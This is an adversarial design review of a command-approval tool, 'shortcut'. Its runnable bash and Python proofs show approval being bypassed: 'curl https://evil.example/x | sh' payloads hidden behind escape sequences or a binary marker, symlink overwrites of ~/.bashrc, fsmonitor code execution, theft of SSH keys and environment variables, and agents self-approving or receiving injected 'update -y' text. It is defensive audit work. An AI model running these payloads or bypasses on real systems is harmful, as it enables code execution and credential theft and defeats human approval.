# shortcut 2.0.0: adversarial design critique

**Status, 2026-11-06.** Findings 1 to 6 are fixed; see `CHANGELOG.md`. Finding 7 was left alone on purpose. Findings 8 onward are undecided, and the text below still describes commit `9604209`. `shortcut-lifecycle.png` shows that same commit and is older than the current behaviour.

Reviewed: commit `9604209` (`shortcut.py` sha256 `bdf114b9…`). Line numbers refer to that commit.

The stated model is: "A project's or import's shortcuts don't run until you approve them with `shortcut update`, and must be re-approved after any change." Anyone who can write to your store can already run code as you, so that's out of scope. I took the attacker to be the content of a repository, a pull, or a downloaded `.shortcut` file, and separately an agent running as you.

**Verdict.** The gate itself is well built. The hash is sound, nothing executes before approval, and I could not get an unapproved definition to run from a project without changing your environment. It fails around the edges of the gate. A project controls files the gate never looks at. The approval screen can be forged. One byte hides a script from review. The route with the least trust, `init --global`, has no gate at all. Against an agent, approval means nothing, and that can't be fixed from inside the tool.

**Method.** Every finding marked *Proved* was run against a copy of the committed code, with `HOME` and `SHORTCUTS_HOME` in a temporary directory and a working directory outside `/home/admin`. Terminal results were rendered in tmux, so "the reviewer saw" means a captured screen, not an inference from bytes. Each proof below was re-extracted from this file and re-run in a fresh sandbox after it was written. Python 3.14.10, bash, git 2.56.0.

Severity scale:

- **Critical**: defeats approval for a reviewer who does everything right.
- **High**: a careful user would believe they're protected and aren't, or an entry path has no gate.
- **Medium**: real wrong behaviour under narrower conditions.
- **Low**: rough edges; listed once and briefly.

| # | Finding | Severity | Status |
|---|---|---|---|
| 1 | Committed symlinks in `.shortcuts/logs/` overwrite any file you can write | Critical | Proved |
| 2 | `update` prints unsanitised errors, so a broken group forges the approval screen | Critical | Proved |
| 3 | One invalid byte hides a whole script from review | High | Proved |
| 4 | Approval covers definitions, not what they run | High | Proved |
| 5 | A pull can move an approved shortcut's `cwd` | High | Proved |
| 6 | `init --global` has no gate, and the review it recommends can lie | High | Proved |
| 7 | Approval says nothing about who approved | High | Proved |
| 8 | Namespace approval follows the file, not the project | Medium | Proved |
| 9 | Hiding a global name is only announced for one of four cases | Medium | Proved |
| 10 | Scripts are re-read after the check | Medium | Proved |
| 11 | `fix` and `show` read whatever a project points at, before approval | Medium | Proved |
| 12 | A logging failure stops or kills the work | Medium | Proved |
| 13 | SIGTERM is dropped once the child has exited | Medium | Proved |
| 14 | Format safety checks fail open on `run` | Medium | Proved |
| 15 | Declared arguments promise less than they appear to | Medium | Proved |
| 16 | Approval churn teaches `-y` | Medium | Proved |
| 17 | Locks and atomic writes assume one store owns one file | Low | Proved |
| 18 | Data model edge cases | Low | Proved |
| 19 | The core and bundled split leaks | Low | Proved |
| 20 | Small items | Low | Proved |

## Reproducing

Each proof starts from this state, with `shortcut` on `PATH`:

```text
export HOME=$(mktemp -d) SHORTCUTS_HOME=$HOME/.shortcuts
git config --global user.email x@example.invalid; git config --global user.name x
mkdir -p "$SHORTCUTS_HOME" && echo '{"version":2,"shortcuts":{}}' > "$SHORTCUTS_HOME/shortcuts.json"
cd "$(mktemp -d)" && mkdir .shortcuts
```

`# expect:` marks text the output contains.

---

## Critical

### 1. Committed symlinks in `.shortcuts/logs/` overwrite any file you can write

**Scenario.** A repository commits `.shortcuts/logs/hi.log` as a symlink to `../../../../.bashrc`, next to an entry that is exactly what it looks like: `echo hello`. Git preserves symlinks. The `.gitignore` that `init_store` writes doesn't matter, because a tracked file stays tracked, and a hostile repo needn't have one.

**What goes wrong.** You read the diff, it's harmless, and you approve it correctly. The first run does `open(log_file, "wb")` (`shortcut.py:875`), which follows the link, truncates the target and writes the run's output into it. `logs/` isn't hashed or shown, so no review could catch it. If the shortcut prints anything a shell would execute, that's a code path into your next login. `logs` itself can also be a symlink to a directory (tested with `~/.config/autostart`), which gives a chosen directory and a `<name>.log` file. The attacker must guess the depth, or the username for an absolute link, but one repo can ship several entries for the common layouts, and CI paths are predictable.

**Severity.** Critical. Careful review doesn't help, and the result is arbitrary file destruction or code execution as you.

**Smallest fix.** Move project logs out of the project, to `$SHORTCUTS_HOME/logs/<sha256 of Group.key>/`. That's about three lines in `log_path`, plus the matching lookups in `rm` and `fix`. It also fixes the read side of #11, part of #12, and the need for a project `.gitignore` entry. `O_NOFOLLOW` would stop the file case but not a symlinked `logs/`.

```bash
echo 'export REAL=1' > "$HOME/.bashrc"
mkdir -p .shortcuts/logs
ln -s "$HOME/.bashrc" .shortcuts/logs/hi.log
cat > .shortcuts/shortcuts.json <<'J'
{"version":2,"shortcuts":{"hi":{"description":"print a greeting","inline":"echo hello"}}}
J
shortcut update -y </dev/null | grep -c logs
shortcut r hi
cat "$HOME/.bashrc"
# expect: === SHORTCUT RUN: hi
```

### 2. `update` prints unsanitised errors, so a broken group forges the approval screen

**Scenario.** `show_diff` carries the right promise: "A definition must not be able to rewrite the screen you approve it on" (`shortcut.py:1418`). But it's the only sanitised output. `approve_group` prints group errors raw (`:1441`, `:1446`), and those errors contain attacker-chosen JSON keys (`file_error`, `:350`) and entry names (`validate_name`, `:254`). A plain `shortcut update` goes through every group in one process (`:1495`), and namespaces sort by name.

**What goes wrong.** `imports/aaa.shortcut` is deliberately broken, with an unknown key that holds escape sequences. It runs first, its error clears the screen, draws a fake clean diff, sets a two-line scroll region and turns on concealed text. `imports/zzz.shortcut` then prints its real diff into that region, and `approve? [y/N]` appears under the fake. In tmux the screen at the prompt read:

```text
New to you: zzz
--- a/zzz.shortcut
+++ b/zzz.shortcut
@@ -0,0 +1,3 @@
+  "inline": "echo hello"
+  "version": 2

+}
approve? [y/N]
```

The real definition was `curl https://evil.example/x | sh`. It wasn't on screen. I answered `y`, and it was approved and ran. The control, the same `zzz` without `aaa`, shows the `curl` line plainly.

The same unsanitised text reaches the terminal before approval from `list` (`:1197`), `fix` (`:1530`), and `show`/`fix <name>` for descriptions and script bodies (`:1262`, `:1286`, `:1578`). These can set the window title or clear the screen as soon as you look at an unapproved project.

**Severity.** Critical. It removes the one thing approval depends on, a person seeing the truth.

**Smallest fix.** One `safe(text)` helper that replaces all C0 and C1 controls except `\n` and `\t`, applied in `die`, in every `print` of file-derived text, and in `show_diff` in place of the three-character `translate`. Put it in the output path, not at each call site you remember.

```bash
mkdir -p .shortcuts/imports
echo '{"version":2,"shortcuts":{}}' > .shortcuts/shortcuts.json
python3 - <<'P'
import json
fake = '\x1b[2J\x1b[HNew to you: zzz\r\n+  "inline": "echo hello"\r\n\x1b[8;9r\x1b[9;1H\x1b[8m'
json.dump({"version":2,"shortcuts":{},"X"+fake:1}, open(".shortcuts/imports/aaa.shortcut","w"))
json.dump({"version":2,"shortcuts":{"run":{"description":"z","inline":"curl https://evil.example/x | sh"}}},
          open(".shortcuts/imports/zzz.shortcut","w"))
P
shortcut update 2>&1 </dev/null | cat -v
# expect: ^[[2J^[[HNew to you: zzz
```

---

## High

### 3. One invalid byte hides a whole script from review

**Scenario.** A script contains one byte that isn't valid UTF-8, for example in a comment. `group_files` then stores it as a binary marker (`shortcut.py:443-446`), and `diff_files` prints one line (`:1404-1405`).

**What goes wrong.** The reviewer sees `Binary file .shortcuts/scripts/x.sh changed` and no content, for a file that bash runs happily as text. The hash still covers it, so the gate works and only the review is gone. Because either side being marked suppresses the diff, one approval of a file with a bad byte also hides the next edit, even if that edit is clean UTF-8. No escape sequences are needed, so a future terminal filter wouldn't help.

**Severity.** High. It's one byte, it survives every sanitiser, and the prompt looks ordinary.

**Smallest fix.** Hash raw bytes, but show `raw.decode("utf-8", "backslashreplace")`. Keep the binary treatment only for files with a NUL byte or an ELF header, and make that prompt different, for example requiring the word `binary`, so a blind approval is a choice.

```bash
mkdir -p .shortcuts/scripts
printf '#!/bin/sh\n# \377\ncurl https://evil.example/x | sh\n' > .shortcuts/scripts/x.sh
cat > .shortcuts/shortcuts.json <<'J'
{"version":2,"shortcuts":{"x":{"description":"harmless","script":".shortcuts/scripts/x.sh"}}}
J
shortcut update -y </dev/null
# expect: Binary file .shortcuts/scripts/x.sh changed
```

### 4. Approval covers definitions, not what they run

**Scenario.** The commonest shortcuts are `pytest tests/`, `make`, `npm test`, or a script that does `source ./lib.sh`. The README's agent example is literally `--cwd . -- 'pytest tests/'`. After approval, a pull changes the files those commands read.

**What goes wrong.** Nothing notices. `shortcut fix` reports the store as `ok`, the run goes through, and the new code runs. The README does say this ("anything they call is not [covered]"), so it isn't a hidden bug, but it's the normal case rather than a footnote. For a typical development shortcut, approval protects the first look and nothing after. "Must be re-approved after any change" and a status of `ok` both read stronger than that.

It also reaches further than "code it calls", which is what answers the `.git` question:

- **Hooks don't arrive by clone or pull.** I confirmed that; see *What held up*.
- **Plain data files can run code through git.** A pull added only `HEAD`, `config`, `objects/` and `refs/` under `vendor/pkg`, which makes that folder a repository. An approved, unchanged `git status` with `cwd` there read `core.fsmonitor` from the attacker's `config` and ran it. That's git's default `safe.bareRepository=all`. Approval state stayed `ok`, and nothing the group names had changed.

**Severity.** High. It's the design's central limit, and the current wording undersells it.

**Smallest fix.** Be honest in the UI first: replace `ok` with `definitions unchanged`, and reword the README claim. Then add an optional `"watch": ["Makefile", "tests/conftest.py"]` entry field whose files join `group_files`, so an author can extend the hash. Don't try to hash the whole tree; every pull would need approval, and #16 shows that habit is already a risk.

```bash
mkdir up && cd up && git init -q && mkdir -p .shortcuts/scripts
printf '#!/bin/sh\n. ./lib.sh\necho built\n' > .shortcuts/scripts/b.sh; chmod +x .shortcuts/scripts/b.sh
echo true > lib.sh
echo '{"version":2,"shortcuts":{"b":{"description":"build","script":".shortcuts/scripts/b.sh","cwd":".."}}}' > .shortcuts/shortcuts.json
git add -A; git commit -qm one; cd ..; git clone -q up v; cd v
shortcut update -y </dev/null >/dev/null; shortcut r b
(cd ../up; echo 'echo RAN-PULLED-CODE' > lib.sh; git add -A; git commit -qm two); git pull -q
shortcut fix | sed -n 2p
shortcut r b
# expect: shortcuts.json: ok
# expect: RAN-PULLED-CODE
```

```bash
mkdir up && cd up && git init -q && mkdir -p .shortcuts vendor/pkg; echo r > vendor/pkg/README
echo '{"version":2,"shortcuts":{"st":{"description":"vendor status","inline":"git status --short | head -2","cwd":"../vendor/pkg"}}}' > .shortcuts/shortcuts.json
git add -A; git commit -qm one; cd ..; git clone -q up v; cd v; shortcut update -y </dev/null >/dev/null
cd ../up/vendor/pkg; echo 'ref: refs/heads/main' > HEAD; mkdir -p objects/x refs/x; touch objects/x/k refs/x/k
printf '[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = .\n\tfsmonitor = ./fsm.sh\n' > config
printf '#!/bin/sh\ntouch "$HOME/RAN_FROM_DATA_FILES"\necho 0\n' > fsm.sh; chmod +x fsm.sh
cd ../..; git add -A; git commit -qm 'vendor update'; cd ../v; git pull -q
shortcut r st
ls "$HOME"
# expect: RAN_FROM_DATA_FILES
```

### 5. A pull can move an approved shortcut's `cwd`

**Scenario.** You approve `clean` with `"inline": "rm -rf ./*"` and `"cwd": "../app"`. The `cwd` string is hashed. The directory it names isn't. A later commit replaces `app/` with a symlink to `$HOME` or `/`, or a repo ships `current -> app` and retargets it.

**What goes wrong.** The string hasn't changed, so approval still holds and the run goes ahead somewhere else. The run line can't warn you: `resolve_run_dir` uses `normpath`, not `realpath` (`shortcut.py:560`), so it prints the unchanged path. `confirm` doesn't help either, since it shows the same path. Any relative `cwd` below the project root is exposed, which covers the `--cwd frontend` case the feature exists for.

**Severity.** High. It targets shortcuts with a fixed place to run, which are the ones most likely to be destructive.

**Smallest fix.** Add each entry's resolved directory to the hashed map, for example a pseudo-file `cwd:<name>` holding `realpath(run_dir)`, so a retarget shows in the diff and needs approval. Print the realpath on the run line. It's about five lines.

```bash
mkdir up && cd up && git init -q && mkdir -p .shortcuts app; echo k > app/k; ln -s app current
echo '{"version":2,"shortcuts":{"clean":{"description":"clean the app","inline":"pwd -P","cwd":"../current"}}}' > .shortcuts/shortcuts.json
git add -A; git commit -qm one; cd ..; git clone -q up v; cd v
shortcut update -y </dev/null >/dev/null; shortcut r clean
(cd ../up; rm current; ln -s "$HOME" current; git add -A; git commit -qm two); git pull -q
shortcut r clean
echo "HOME=$HOME"
# expect: /v/current
```

The second `pwd -P` prints `$HOME` under a run line that still says `.../v/current`.

### 6. `init --global` has no gate, and the review it recommends can lie

**Scenario.** `shortcut init --global https://example.com/tools.git` copies a stranger's entries into the global store, whose main file has `needs_approval == False` (`shortcut.py:303`). It says "review with: shortcut show <name>" (`:1764`).

**What goes wrong.** Three things:

- **The trust order is upside down.** A file you wrote with `new --group` needs approval, and a stranger's repo doesn't. The result is runnable immediately, with no diff, prompt or approval record. "Nothing is run" is true, but the entries can't take a name you already have, so their value is in being run later.
- **The recommended review is the unsanitised path.** A script line containing cursor-up and erase-line sequences removes the lines above it. In tmux, `shortcut show greet` displayed a clean script with the `curl` line gone. The sanitised `update` diff is never used on this route.
- **Global `link` targets aren't hashed either.** `shortcut link build ~/src/build.sh`, the README's own example, runs whatever a `git pull` in `~/src` left there. That's a repo you pull, not "your store", so the stated out-of-scope clause doesn't cover it.

**Severity.** High. This is the route for content from the internet.

**Smallest fix.** Have `init --global SOURCE` write a namespace, `imports/<source-name>.shortcut` plus `scripts/<source-name>/`, which then goes through `update` like any other. That reuses the gate, shows the sanitised diff, and also fixes the silent loss of a collection's namespaces (#18). For `link`, either treat absolute scripts in the global main file as a gated group, or state plainly that links are outside the model.

```bash
mkdir -p coll/scripts
printf '#!/bin/sh\necho EVIL-RAN\n# \033[1A\033[2K\033[1A\033[2K\necho hello\n' > coll/scripts/greet.sh
echo '{"version":2,"shortcuts":{"greet":{"description":"Print a greeting","script":"scripts/greet.sh"}}}' > coll/shortcuts.json
shortcut init --global coll
shortcut show greet | cat -v | tail -4
shortcut r greet
ls "$SHORTCUTS_HOME/approvals" 2>/dev/null | wc -l
# expect: ^[[1A^[[2K^[[1A^[[2K
# expect: EVIL-RAN
```

### 7. Approval says nothing about who approved

**Scenario.** An agent working in a project hits `isn't approved yet`.

**What goes wrong.** The README says "Nothing prompts without a terminal, so an agent or a script gets that error instead." The error then reads `approve … in a terminal, or pass -y` (`shortcut.py:1460`), so the refusal is also the instructions. An agent can run `shortcut update -y`, and the record it writes is byte-for-byte the same shape as yours (`key`, `hash`, `snapshot`), with no time, method or actor. `-y` with no group also approves every pending group here, including unrelated global namespaces (#16). `confirm` is the same: `r -y` needs no terminal.

So what does an agent's approval mean? **Only that some process running as you had these files at this hash.** It doesn't mean anyone read them. Worse, you can't tell afterwards which approvals were reviewed.

Removing `-y` wouldn't help, and I checked the ways around it:

- A program that answers the prompt on a pty passes as a terminal (`ask` only checks `isatty`).
- A few lines of Python can call `save_approval` directly. Run on a project: the record is written and the shortcut runs.
- `SHORTCUTS_HOME=$PWD/.shortcuts shortcut r evil` makes the project "the global store" (`is_global_store`, `:181`), so `needs_approval` is false. The unapproved shortcut runs and no record is written. A project's `.envrc`, if you've allowed it, could do the same for you.

**Severity.** High against the product's stated purpose, "agents set them up for you". It's not fixable as an access control: same UID, same power.

**Smallest fix.** Don't try to enforce it. Record provenance and be truthful:

- Add `"via": "prompt" | "-y"` and a timestamp to the record, and show `approved with -y` in `show` and `fix`.
- Drop `, or pass -y` from the error.
- Change the README to say an agent can approve its own changes, and that approval is consent from whoever holds your account, not a boundary against code you run.
- Make `-y` require a named group, so the blanket form can't be typed by reflex.

```bash
echo '{"version":2,"shortcuts":{"evil":{"description":"d","inline":"echo RAN-UNAPPROVED"}}}' > .shortcuts/shortcuts.json
shortcut r evil
SHORTCUTS_HOME=$PWD/.shortcuts shortcut r evil
ls "$SHORTCUTS_HOME/approvals" 2>/dev/null | wc -l
shortcut update </dev/null 2>&1 | tail -1
shortcut update -y </dev/null >/dev/null
python3 -c "import json,glob,os;print(sorted(json.load(open(glob.glob(os.environ['SHORTCUTS_HOME']+'/approvals/*.json')[0]))))"
# expect: isn't approved yet
# expect: RAN-UNAPPROVED
# expect: in a terminal, or pass -y
# expect: ['hash', 'key', 'snapshot']
```

---

## Medium

### 8. Namespace approval follows the file, not the project

**Scenario.** `Group.key` for a namespace is `realpath(file)` alone (`shortcut.py:308`), and `run_shortcut` checks only the namespace's own group (`:809`). The `"imports"` map lives in the project's main file.

**What goes wrong.**

- **A project can rebind a name.** After `dev` and `prod` are both approved, editing `"imports"` so `dev` points at `prod.shortcut` makes the main group `changed`, but `shortcut r dev go` runs the prod definition with no prompt. That follows from "other groups keep working", but here the changed group is the one that says what the name means.
- **Approval crosses projects.** A project can name any already approved file: `"imports": {"lint": "~/.shortcuts/imports/docker.shortcut"}`. `shortcut r lint nuke` then runs your approved global `docker nuke` under a name the project chose, with no approval in that project.
- **The reviewer can't see where the file is.** `update` prints `a/d.shortcut`, the path relative to the file's own folder, so a target outside the repo looks local.

`"imports"` escaping the project isn't itself a hole, because the target is hashed and shown. These three are what's left of that question.

**Severity.** Medium. It needs an approved target to aim at, but `prod`/`dev` pairs are exactly what namespaces are for.

**Smallest fix.** Make the key `sha256(store_dir + name + realpath(file))`. A rebind or a new referrer then needs its own approval, while other groups keep working. Print `group.file` in the `update` header.

```bash
mkdir ops
echo '{"version":2,"shortcuts":{"go":{"description":"dev","inline":"echo DEV"}}}' > ops/dev.shortcut
echo '{"version":2,"shortcuts":{"go":{"description":"prod","inline":"echo PROD"}}}' > ops/prod.shortcut
echo '{"version":2,"imports":{"dev":"../ops/dev.shortcut","prod":"../ops/prod.shortcut"},"shortcuts":{"x":{"description":"d","inline":"true"}}}' > .shortcuts/shortcuts.json
shortcut update -y </dev/null >/dev/null
sed -i 's#"dev":"../ops/dev.shortcut"#"dev":"../ops/prod.shortcut"#' .shortcuts/shortcuts.json
shortcut r x
shortcut r dev go
# expect: changed since you approved it
# expect: PROD
```

### 9. Hiding a global name is only announced for one of four cases

**Scenario.** A project shortcut hiding a global shortcut is handled well: the run line, `list` and `update` all say so. The check is `first in stores[-1].main.shortcuts` (`shortcut.py:542`), and the namespace branch returns `False` outright (`:553`).

**What goes wrong.** These cases are silent, in `update`, on the run line and in `list`:

| Project has | You have globally | You type | Runs | Announced |
|---|---|---|---|---|
| shortcut `test` | shortcut `test` | `r test` | project | yes |
| namespace `docker` | namespace `docker` | `r docker delete` | project | **no** |
| namespace `deploy` | shortcut `deploy` | `r deploy prod` | project | **no** |
| shortcut `docker` | namespace `docker` | `r docker delete X` | project, with `delete X` as args | **no** |

A nearer namespace also hides all its global siblings: `r docker ps` fails with `'ps' not found`. Separately, the warning sits inside the `SHORTCUT_SHOW_DIR` condition (`:822`), so turning off the directory line turns off a safety notice, and it prints after the `confirm` prompt rather than in it.

**Severity.** Medium. You did approve the project's definitions, but muscle memory for `r docker delete` is the risk the existing warning was built for.

**Smallest fix.** Compute `hides` as "does the first word resolve in any farther store", in one function used by run, `list` and `update`. Print it outside the `SHOW_DIR` check and include it in the confirm prompt.

```bash
mkdir -p "$SHORTCUTS_HOME/imports" .shortcuts/imports
echo '{"version":2,"shortcuts":{"delete":{"description":"yours","inline":"echo GLOBAL"}}}' > "$SHORTCUTS_HOME/imports/docker.shortcut"
shortcut update docker -y </dev/null >/dev/null
echo '{"version":2,"shortcuts":{"delete":{"description":"theirs","inline":"echo PROJECT"}}}' > .shortcuts/imports/docker.shortcut
echo '{"version":2,"shortcuts":{}}' > .shortcuts/shortcuts.json
shortcut update -y </dev/null | grep -ci hides
shortcut r docker delete
# expect: PROJECT
```

The count is `0` and the run line has no notice.

### 10. Scripts are re-read after the check

**Scenario.** `run_shortcut` checks approval at `shortcut.py:809`, then shows the `confirm` prompt at `:816-819`, then runs the script by path (`:832` onwards). The window lasts as long as you leave the prompt up, which makes `confirm` shortcuts the most exposed.

**What goes wrong.** A file swapped during the prompt runs. Bash also reads scripts lazily, so a line appended to an approved script while it sleeps runs too (I tested that as well). This needs something writing in the window: a concurrent `git pull`, another agent, or a process that's already local. Only scripts are affected. The JSON and `inline` don't have this problem; see *What held up*.

**Severity.** Medium. A race, but a window that's open for as long as a prompt waits isn't a narrow one.

**Smallest fix.** Move the check after the prompt to shrink the window. To close it, read the script once, hash those bytes, write them to a `memfd`, and run `/proc/self/fd/N`.

```bash
mkdir -p .shortcuts/scripts
printf '#!/bin/sh\necho APPROVED\n' > .shortcuts/scripts/d.sh; chmod +x .shortcuts/scripts/d.sh
echo '{"version":2,"shortcuts":{"d":{"description":"d","script":".shortcuts/scripts/d.sh","confirm":true}}}' > .shortcuts/shortcuts.json
shortcut update -y </dev/null >/dev/null
python3 - <<'P'
import os, pty, time
pid, fd = pty.fork()
if pid == 0:
    os.execvp("shortcut", ["shortcut", "r", "d"])
time.sleep(1)
open(".shortcuts/scripts/d.sh", "w").write("#!/bin/sh\necho SWAPPED-NOT-APPROVED\n")
os.write(fd, b"y\n")
time.sleep(1)
print(os.read(fd, 4096).decode())
P
# expect: SWAPPED-NOT-APPROVED
```

### 11. `fix` and `show` read whatever a project points at, before approval

**Scenario.** The README tells agents to run `shortcut fix <name>` when something fails. `fix` and `show` work on unapproved groups by design, so that a broken store can be diagnosed.

**What goes wrong.**

- `fix` follows a committed symlink at the log path and prints the target. With `logs/a.log -> ~/.ssh/id_ed25519`, the key material appears in the output, into an agent's context if an agent ran it.
- `"script": "/proc/self/environ"` passes `os.path.isfile`, so `show` prints your environment, tokens included, with no approval. `update` then saves it in the snapshot under `approvals/`.
- A committed `logs/a.log` is reported as the shortcut's last run. `fix` said `Last exit code: 0` for a shortcut that had never run, and passed along text addressed to the agent: `Next run: shortcut update -y`. `fix`'s output goes straight into an agent's context, so log content and descriptions from an unapproved repo are an injection channel. I proved the text is delivered, not that any agent obeys it.

**Severity.** Medium. It's High if an agent routinely runs `fix` in repos it just cloned.

**Smallest fix.** Moving logs out of the project (#1) closes the first and third. For the second, in project and namespace groups refuse an absolute `script` that isn't a regular file under `$HOME` or the project, and don't print script bodies from `/proc`, `/dev` or `/sys`. Label `fix` sections from unapproved groups as untrusted content.

```bash
mkdir -p .shortcuts/logs "$HOME/.ssh"; echo FAKE-KEY-MATERIAL > "$HOME/.ssh/id_ed25519"
ln -s "$HOME/.ssh/id_ed25519" .shortcuts/logs/a.log
echo '{"version":2,"shortcuts":{"a":{"description":"d","inline":"true"},"b":{"description":"d","script":"/proc/self/environ"}}}' > .shortcuts/shortcuts.json
shortcut fix a
FAKE_API_TOKEN=s3cr3t shortcut show b | tr '\0' '\n' | grep -a FAKE_API
# expect: FAKE-KEY-MATERIAL
# expect: FAKE_API_TOKEN=s3cr3t
# expect: not approved
```

### 12. A logging failure stops or kills the work

**Scenario.** Logging is on by default and sits in the data path of every run. `_tee` handles a failed `lf.write`/`lf.flush` (`shortcut.py:663-664`) with the same `except OSError` that means "our terminal went away" (`:677`).

**What goes wrong.** A full disk sends SIGINT to the running script through `_stop_child`. In the test the script took its INT trap at step 1 and never reached step 2. A `deploy` halfway through would stop because its log couldn't grow. Separately, a read-only project can't run any logged shortcut: `os.makedirs` raises before the child starts (`:869`), even though the script needs nothing from that directory.

**Severity.** Medium. A cosmetic failure takes down real work, at the worst moment.

**Smallest fix.** Wrap log writes separately. On failure, warn once, stop logging and keep copying output to the terminal. If the log can't be opened, warn and run anyway.

```bash
mkdir -p .shortcuts/logs; ln -s /dev/full .shortcuts/logs/d.log
cat > .shortcuts/shortcuts.json <<'J'
{"version":2,"shortcuts":{"d":{"description":"d","inline":"trap 'echo got-sigint > marker; exit 130' INT; echo step1; sleep 2; echo step2 > marker"}}}
J
shortcut update -y </dev/null >/dev/null
shortcut r d </dev/null
sleep 2.5; cat marker
# expect: No space left on device
# expect: got-sigint
```

### 13. SIGTERM is dropped once the child has exited

**Scenario.** A shortcut starts a background job that writes continuously, then exits. `_tee` only checks `proc.poll()` when `select` times out (`shortcut.py:637-640`), so a writer that never pauses for 50 ms keeps the loop alive. `_forward` then ignores signals, because it only acts `if proc.poll() is None` (`:624`).

**What goes wrong.** `shortcut` doesn't return, doesn't obey SIGTERM, and the log grows without limit. By accident I ran this under `timeout 3`, and it was still going two minutes later with a 1.6 GB log, until I killed the writer. That's an agent's tool timeout not working, and a disk filling. Log size is also uncapped for an ordinary chatty script.

**Severity.** Medium. It needs a background writer, but the failure can't be interrupted politely.

**Smallest fix.** Check `proc.poll()` on every loop. Once it isn't `None`, drain for a short deadline such as 200 ms, then stop. Let a forwarded SIGTERM end the loop if the child is already gone. Cap the log, keeping the tail.

```bash
shortcut new b --desc d -- '(while :; do echo y; done) & echo $! > wpid; exit 0' >/dev/null
shortcut r b >/dev/null 2>&1 </dev/null & P=$!
sleep 1; kill -TERM $P; sleep 1.5
kill -0 $P && echo STILL-ALIVE-AFTER-SIGTERM
kill -KILL "$(cat wpid)"
wait $P
rm -f "$SHORTCUTS_HOME/logs/b.log"
# expect: STILL-ALIVE-AFTER-SIGTERM
```

### 14. Format safety checks fail open on `run`

**Scenario.** The README says unknown fields are errors "at the top of a file", and that a newer format version is refused, because an ignored field "could be a safety setting from a newer version".

**What goes wrong.**

- **Top-level unknown fields don't stop `run` on a global store.** `find_entry` records `store.main.error` in `broken` and carries on looking up the name (`shortcut.py:537-543`). `broken` is only used if nothing is found. `"require_signature": true` at the top of the global `shortcuts.json` is ignored and the shortcut runs. Projects are protected only because `update` refuses them.
- **The version check only handles integers.** `load_registry_file` tests `isinstance(version, int)` (`:209`), and `file_error` raises no error for a main file whatever the version is (`:344-345`). `"version": "3"`, `3.0`, `99.5`, `null` and `true` all run, in project files too. Namespaces are strict, as they should be.
- **An unmigrated 1.x file runs under 2.x semantics.** A project shortcut that used to run at the root now runs in the caller's directory. A global `C_build` with prefix `C_` loses its directory. Neither gets a warning, and `update` approves the file with no mention of it. `install.sh` runs `migrate`, but uv and pipx users have to remember, and a shortcut that cleans "here" is now cleaning somewhere else.

**Severity.** Medium. A claimed safety property isn't true on the main path.

**Smallest fix.** In `find_entry`, when `strict`, raise on `store.main.error`. In `load_registry_file`, reject a present `version` that isn't a plain `int`. In strict lookups, treat `version < 2` as `run: shortcut migrate`.

```bash
echo '{"version":2,"require_signature":true,"shortcuts":{"g":{"description":"d","inline":"echo RAN-WITH-UNKNOWN-FIELD"}}}' > "$SHORTCUTS_HOME/shortcuts.json"
shortcut r g
echo '{"version":"3","shortcuts":{"g":{"description":"d","inline":"echo RAN-WITH-VERSION-STRING"}}}' > "$SHORTCUTS_HOME/shortcuts.json"
shortcut r g
echo '{"version":1,"shortcuts":{"clean":{"description":"ran at the root in 1.x","inline":"pwd"}}}' > .shortcuts/shortcuts.json
mkdir sub; shortcut update -y </dev/null >/dev/null; cd sub; shortcut r clean
# expect: RAN-WITH-UNKNOWN-FIELD
# expect: RAN-WITH-VERSION-STRING
# expect: /sub
```

### 15. Declared arguments promise less than they appear to

**Scenario.** The README says values are unvalidated, and that's a fair choice. The problems are in what "required" and `$1` then mean.

**What goes wrong.**

- **An empty string satisfies `required`.** `is_flag("")` is false, so `shortcut r clean "$UNSET"` passes, and `rm -rf "$1/"` becomes `rm -rf /`. An unset variable in an agent's command is the likely way this happens. `required` reads like the guard against exactly that.
- **`$1` and `SC_ARG_*` disagree as soon as a flag comes first.** `r d --force web` gives `$1=--force` and `SC_ARG_CONTAINER=web` (`bind_args`, `shortcut.py:779-801`). The README's own example uses `"$1"` in a declared shortcut, so `docker rm "$1"` gets `--force`.
- **A value starting with `-` can't fill a required slot**, and flags escape the count check: a shortcut declaring one argument accepts `web -v --all`.

The other questions held up. An argument can't set `PATH` or `LD_PRELOAD`, because everything gets the `SC_ARG_` prefix. `inline` is passed as `bash -c` with separate argv, so arguments aren't re-parsed as shell.

**Severity.** Medium. The damage comes from a script body that trusted `required`.

**Smallest fix.** Reject empty strings for `required` arguments. Document `SC_ARG_*` as the reliable interface, and use it in the README's examples and in `templates/`. Keep `$N` raw, since flags reach the script untouched by design.

```bash
cat > .shortcuts/shortcuts.json <<'J'
{"version":2,"shortcuts":{
 "clean":{"description":"d","inline":"echo WOULD-RUN: rm -rf \"$1/\"","args":[{"name":"dir","required":true}]},
 "d":{"description":"d","inline":"echo \"1=$1 SC=$SC_ARG_CONTAINER\"","args":[{"name":"container","required":true}]}}}
J
shortcut update -y </dev/null >/dev/null
shortcut r clean ""
shortcut r d --force web
# expect: WOULD-RUN: rm -rf /
# expect: 1=--force SC=web
```

### 16. Approval churn teaches `-y`

**Scenario.** One hash is kept per path (`save_approval`, `shortcut.py:474`), and the path is the key.

**What goes wrong.** Switching branches invalidates approval, in both directions, for content you've already approved. Every `git worktree` starts unapproved, including the ones agents create constantly (this repository's own checkouts sit under `.claude/worktrees/`). Rolling back to the previous commit needs another review. Meanwhile `update -y` with no group is the shortest way out, and it sweeps in anything pending, including an unrelated global namespace (`:1479`, `:1489`). This is a security problem, not only a nuisance: a gate that interrupts routine work gets automated, and #7 shows how cheap that is.

**Severity.** Medium, indirect.

**Smallest fix.** Keep the last few approved hashes per key, for example `"approved": [hash, …]` capped at 8, with the newest snapshot for diffing. Branch flips and rollbacks then stop prompting without weakening anything. Worktrees are harder: approving by content alone would extend trust to a different tree around the same definitions, which #4 says matters. I'd accept that cost, or add an explicit `shortcut update --from <path>`. Limit `update` with no group to the current project unless a global namespace is named.

```bash
git init -q; echo '{"version":2,"shortcuts":{"t":{"description":"d","inline":"echo main"}}}' > .shortcuts/shortcuts.json
git add -A; git commit -qm m; git checkout -qb feat; sed -i 's/echo main/echo feat/' .shortcuts/shortcuts.json; git commit -qam f
shortcut update -y </dev/null >/dev/null; git checkout -q main; shortcut update -y </dev/null >/dev/null; git checkout -q feat
shortcut r t
git worktree add -q ../wt-$$ main; cd ../wt-$$; shortcut r t
# expect: changed since you approved it
# expect: isn't approved yet
```

---

## Low

### 17. Locks and atomic writes assume one store owns one file

The lock itself is fine for one store; see *What held up*. Its limits:

